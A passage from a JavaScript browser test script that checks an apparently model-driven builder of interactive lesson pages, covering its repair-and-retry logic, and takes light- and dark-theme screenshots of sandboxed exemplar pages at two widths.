  expect('build(): the repair prompt carries the failures and the failing body',
    /K\.ready\(\) was never called/.test(seen[1].text) && /Check failed: "r = 10 gives 48\.2%/.test(seen[1].text) && seen[1].text.includes('eff, 50, 0.001'), seen[1].text.slice(0, 1500));
  expect('build(): reports its progress', res.status.length >= 3, res.status);

  seen = [];
  sampleHandler = (input, info) => { seen.push({ task: taskOf(input), tier: info.tier }); return broken; };
  const none = await app.page.evaluate(([t, i, l]) => U.interactive.build(t, i, l), [topic, topic.ideas[0], lesson]);
  expect('build(): gives up with null after the first try and two repairs', none === null && seen.length === 3, seen);

  seen = [];
  const noIds = good.replace(/id: 'eff'/g, "id: 'efficiency'").replace(/\.eff\b/g, '.efficiency').replace(/eff: pct/g, 'efficiency: pct');
  sampleHandler = (input) => { seen.push(typeof input === 'string' ? input : ''); return seen.length === 1 ? noIds : good; };
  const fixedIds = await app.page.evaluate(([t, i, l]) => U.interactive.build(t, i, l), [topic, topic.ideas[0], lesson]);
  expect('build(): a page missing an id a lesson check needs is sent back', fixedIds && fixedIds.attempts === 2 && /Missing output "eff"/.test(seen[1] || ''), fixedIds && fixedIds.attempts);

  seen = [];
  sampleHandler = () => { seen.push(1); return good; };
  const skip = await app.page.evaluate(([t, i, l]) => U.interactive.build(t, i, Object.assign({}, l, { interactive: null })), [topic, topic.ideas[0], lesson]);
  expect('build(): no brief, no call, null', skip === null && seen.length === 0);

  expect('no page errors on the host page', app.errors.length === 0, app.errors);
  await app.close();
}

// ---------- screenshots: every exemplar at 360 and 1280, light and dark ----------
section('screenshots (review them in tests/out/kit/)');
for (const ex of examples) {
  for (const width of [360, 1280]) {
    for (const theme of ['light', 'dark']) {
      const app = await openApp({ width, height: 900, file: PAGE });
      await app.page.goto(app.url('#/'));
      await app.page.evaluate((t) => { document.documentElement.dataset.muTheme = t; }, theme);
      const checks = await app.page.evaluate(async (html) => {
        await U.rt.ready;
        document.getElementById('app').style.display = 'none';
        document.body.style.background = 'var(--bg)';
        const box = document.createElement('div');
        box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
        document.body.appendChild(box);
        const m = window.__shot = U.sandbox.mount(box, { html, title: 'exemplar' });
        const c = await Promise.race([m.ready, new Promise((r) => setTimeout(r, 6000))]);
        await new Promise((r) => setTimeout(r, 500));
        return c;
      }, ex.body);
      const path = join(SHOTS, `${ex.name}-${width}-${theme}.png`);
      await app.page.screenshot({ path, fullPage: true });
      const scroll = await app.page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth);
      expect(`${ex.name} ${width} ${theme}: mounted, checks pass, no page errors, no sideways scroll`, Array.isArray(checks) && checks.every((c) => c.ok) && !app.errors.length && scroll, app.errors);
      // The moved state, as render.mjs captures it: every control set elsewhere, the first action pressed.
      const moved = await app.page.evaluate(async (mv) => {
        const movedValue = new Function('return ' + mv)();
        const m = window.__shot, info = await m.inputs();
        for (const c of info.inputs) await m.set(c.id, movedValue(c));
        if (info.actions.length) await m.press();
        await new Promise((r) => setTimeout(r, info.actions.length ? 1200 : 400));
        return (await m.get()).params;
      }, movedValue.toString());
      await app.page.screenshot({ path: join(SHOTS, `${ex.name}-${width}-${theme}-moved.png`), fullPage: true });
      expect(`${ex.name} ${width} ${theme}: moved state (${JSON.stringify(moved)}) without page errors`, !app.errors.length, app.errors);
      await app.close();
    }
  }
}

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) { console.log(failures.map((f) => ' - ' + f).join('\n')); process.exit(1); }
